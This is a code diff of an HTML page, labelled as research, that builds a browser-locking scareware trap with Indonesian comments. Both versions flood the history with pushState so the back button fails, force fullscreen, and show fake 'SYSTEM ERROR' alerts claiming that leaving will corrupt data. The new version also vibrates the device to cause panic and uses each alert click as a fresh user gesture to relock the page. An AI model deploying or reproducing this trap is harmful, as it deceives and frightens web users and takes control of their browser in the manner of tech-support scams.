@@ -1,46 +1,65 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Interaction Research</title>
+    <title>Research: High-Impact UI Trap</title>
     <style>
-        body { margin: 0; background: #000; color: #00ff00; font-family: monospace; overflow: hidden; }
-        /* Tombol transparan raksasa di seluruh layar */
-        #trap {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: rgba(0,0,0,0.1); display: flex; align-items: center;
-            justify-content: center; z-index: 999; cursor: pointer;
+        body { 
+            background: #000; color: #00ff00; font-family: monospace; 
+            text-align: center; display: flex; align-items: center; 
+            justify-content: center; height: 100vh; margin: 0;
+            cursor: pointer; /* Biar user klik di mana saja */
         }
-        .msg { padding: 20px; border: 2px solid #00ff00; pointer-events: none; }
+        .start-btn {
+            padding: 20px 40px; font-size: 1.2rem; background: #d93025;
+            color: white; border: none; border-radius: 10px;
+        }
     </style>
 </head>
 <body>
 
-    <div id="trap">
-        <div class="msg">ERROR: Click to Repair System</div>
-    </div>
+    <button class="start-btn" onclick="startTrap()">AKTIFKAN SESI AMAN</button>
 
     <script>
-        const trap = document.getElementById('trap');
-        let counter = 0;
+        let isTrapped = false;
 
-        // Tiap kali user klik (karena panik atau mau repair), kita jebloskan ke history
-        trap.onclick = function() {
-            counter++;
-            for (let i = 0; i < 20; i++) {
-                window.history.pushState({p: i}, "", `?fix_attempt=${counter}_${i}`);
+        function startTrap() {
+            isTrapped = true;
+            lockDown();
+        }
+
+        // Fungsi Inti untuk Mengunci UI
+        function lockDown() {
+            console.log("[!] Locking Down UI...");
+
+            // 1. Fullscreen
+            const el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+
+            // 2. History Flooding
+            for (let i = 0; i < 50; i++) {
+                window.history.pushState({p: i}, "", "?locked=" + Math.random().toString(36).substring(7));
             }
-            alert("System Repairing... Please wait (" + counter + "/10)");
-        };
+        }
 
-        // KUNCINYA: Saat user tekan Back, kita deteksi dan paksa klik lagi
+        // DETEKSI USER COBA KELUAR (Back Button)
         window.onpopstate = function() {
-            // Kita kasih alert biar user harus KLIK 'OK' (interaksi baru!)
-            // Ini akan mereset 'User Activation' dan memvalidasi history baru
-            alert("Warning: Leaving this page may corrupt your data! Click OK to stay safe.");
-            for (let i = 0; i < 10; i++) {
-                window.history.pushState(null, "", "?persistence=" + Math.random());
-            }
+            if (!isTrapped) return;
+
+            // Getaran (opsional biar panik)
+            if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
+
+            // Munculkan Alert Palsu
+            // Kuncinya: Klik OK di sini dianggap User Gesture baru!
+            alert("⚠️ SYSTEM ERROR ⚠️\nNavigasi diblokir untuk keamanan data.\n\nKlik OK untuk me-lockdown kembali sesi Anda.");
+
+            // USER KLIK OK -> TRAP AKTIF LAGI
+            // Kita kasih delay mikro agar browser sempat memproses alert-close
+            setTimeout(() => {
+                lockDown();
+            }, 100);
         };
     </script>
 </body>
